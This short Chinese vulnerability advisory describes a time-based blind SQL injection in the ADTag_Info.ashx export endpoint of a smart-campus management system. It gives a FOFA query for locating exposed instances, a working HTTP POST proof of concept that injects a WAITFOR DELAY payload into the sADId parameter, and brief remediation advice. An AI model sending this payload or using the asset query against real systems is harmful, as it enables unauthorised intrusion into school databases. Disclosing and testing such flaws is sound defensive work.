## 智慧校园(安校易)管理系统 ADTag_Info.ashx SQL注入漏洞

## 漏洞描述
`ADTag_Info.ashx` 导出接口对 `sADId` 参数未做过滤，攻击者可以通过 `WAITFOR DELAY` 语句触发时间盲注，最终可能利用数据库扩展执行系统命令。

## 资产测绘
```
fofa: title="智慧综合管理平台登入"
```

## POC
```
POST /Module/BPCJ/AD_Tag/Controller/ADTag_Info.ashx HTTP/1.1
Host: <target>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 51

action=exportExcel&sADId=';WAITFOR+DELAY+'0:0:5'--
```
返回延迟 ≥5 秒即说明存在注入。

## 修复建议
- 参数化查询并过滤特殊字符
- 关闭数据库危险扩展（如 xp_cmdshell）

